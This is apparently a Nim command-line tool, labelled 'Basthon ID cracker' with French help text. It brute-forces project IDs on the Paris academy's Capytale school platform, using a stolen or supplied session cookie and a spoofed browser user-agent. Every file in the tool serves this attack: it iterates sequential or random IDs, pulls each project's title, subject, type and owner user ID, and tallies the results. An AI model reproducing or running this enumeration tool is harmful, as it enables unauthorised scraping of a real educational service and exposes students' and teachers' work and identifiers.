import httpclient, asyncdispatch, strutils, strformat, tlib, os, json, tables, random

const
    blue    = rgb(11, 121, 255)
    red     = rgb(255, 77, 64)
    green   = rgb(0, 255, 127 )
    white   = rgb(255,255,255)
    yellow  = rgb(255,255,102)
    italiq  = italic()
    cyan    = rgb(102, 179, 255)
    magenta = rgb(255, 102, 217)
    def     = def()

const 
    link        = "https://capytale2.ac-paris.fr/web/node/"
    link_format = "?_format=json"
    chars       = "0123456789"

var
    cookie      = ""
    code        = "1111"
    loop        = 100
    ens_count   = initCountTable[string]()
    acti_count  = initCountTable[string]()
    acti_type:    string
    enseignement: string
    verbose     = false
    r_gen:bool  = false
    projects:   int16

type EKeyboardInterrupt = object of CatchableError
proc handler() {.noconv.} =
  raise newException(EKeyboardInterrupt, "Keyboard Interrupt")
setControlCHook(handler)

let 
    banner = &"""
{blue}    ____  ___   _____ __________  ___   ________ __
   / __ )/   | / ___// ____/ __ \/   | / ____/ //_/
  / __  / /| | \__ \/ /   / /_/ / /| |/ /   / ,<
 / /_/ / ___ |___/ / /___/ _, _/ ___ / /___/ /| |
/_____/_/  |_/____/\____/_/ |_/_/  |_\____/_/ |_| {def}
                {blue}Basthon ID cracker{def}

"""
    help = """
Programme fais en NIM afin de craquer les ID des projets Basthon (async version)

    -c, --cookie    STRING  Cookie pour acceder au site   
    -C, --code      CODE    Premier code a essayer     
    -h, --help              Affiche la page d'aide
    -v, --verbose           Affiche les codes invalides
    -l, --loops             Nombre de codes à essayer
"""



proc show_res() =
  if len(ens_count) > 0:
    echo &"\nAffichages du nombre de projets par {blue}matières{def}:"
    for ens in ens_count.keys:
      echo &"{blue}{ens.toUpperAscii()}{def}: {white}{ens_count[ens]}{def} projets trouvé(s)"

    echo &"\nAffichages du nombre de projets par {blue}activités{def}:"
    for act in acti_count.keys:
      echo &"{blue}{act.toUpperAscii()}{def}: {white}{acti_count[act]}{def} projets trouvé(s)"

proc gen(code: var string, chars: string): string=
    for i in 0..len(code):
        var index = find(chars, code[i])
        if index+1 == len(chars): code[i] = chars[0] else: code[i] = chars[index+1];break
    return code

proc error(arg: string) =
    ## Append [ERROR] to what ever string you give and exit with an exit code of 1
    stdout.write &"{red}[ERROR]{def()} {arg}\n"
    quit(1)

proc info(arg: string) =
    stdout.write &"{blue}[INFO]{def()}  {arg}\n"

proc warn(arg: string) =
    stdout.write &"{yellow}[WARNING]{def()}  {arg}\n"

if paramCount() < 1:
    echo help
    error "Not enough arguments"

echo banner

for i in 1..paramCount():
    let arg = paramStr(i)
    case arg
        of "--cookie", "-c":
            cookie = paramStr(i+1)
            if cookie.len() < 10: error "Invalid cookie"
            info &"Using cookie {cookie[0..13]}..."

        of "--code", "-C":
            code = paramStr(i+1)
            info &"First code to test: {code}"

        of "--loops", "-l":
            loop = parseInt(paramStr(i+1))
        
        of "--random", "-r":
            r_gen = true
            info "Using random generation algorithm"

        of "--verbose", "-v":
            verbose = true
        of "--help", "-h":
            echo help
            quit(0)

if cookie == "": error "Please specify a cookie using --cookie COOKIE_STRING"
proc process() {.async.} =
    randomize()
    let client = newAsyncHttpClient("Mozilla/5.0 (X11; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0")
    client.headers = newHttpHeaders({"Cookie": cookie})

    for i in 0..loop:
        try:
            
            let content = await client.getContent(link & code & link_format)
            let json = parseJson(content)
            try:
                let
                    id = json{"nid"}[0]{"value"}.getInt()
                    activity_type = json{"type"}[0]{"target_id"}.getStr()
                    user_id = json{"uid"}[0]{"target_id"}.getInt()
                    title = json{"title"}[0]{"value"}.getStr()

                if json{"field_enseignement"}[0]{"value"}.getStr() == "":
                    enseignement = "No enseignement"
                else:
                    enseignement = json{"field_enseignement"}[0]{"value"}.getStr()
                if activity_type == "notebook": acti_type = "notebook" else: acti_type = "console"
                ens_count.inc(enseignement)
                acti_count.inc(activity_type)
                projects += 1
                echo "\n------------------------\n$1ID$2: $3\n$4TITRE$2: $5\n$6MATIERE$2: $7\n$8TYPE$2: $9\n$10ID Utilisateur$2: $11\n$12Lien$2: $13https://capytale2.ac-paris.fr/basthon/$14/?id=$3$2\n------------------------\n".format(red, def, id, yellow, title, cyan, enseignement, blue, activity_type, magenta, user_id, green, italiq, acti_type)
            except IndexDefect:
                discard
            except AssertionDefect:
                discard
        except HttpRequestError:
            if verbose: warn &"Invalid code: {code}"
        finally:
            if not r_gen: code = gen(code, chars) else: code = $rand(1000..99999)
    client.close()
    show_res()
    echo &"\nNombre de projets {blue}total{def} trouvé: {white}{projects}{def}"

try:
    waitFor process()
except EKeyboardInterrupt:
    show_res()
    echo &"\nNombre de projets {blue}total{def} trouvé: {white}{projects}{def}"
    quit(0)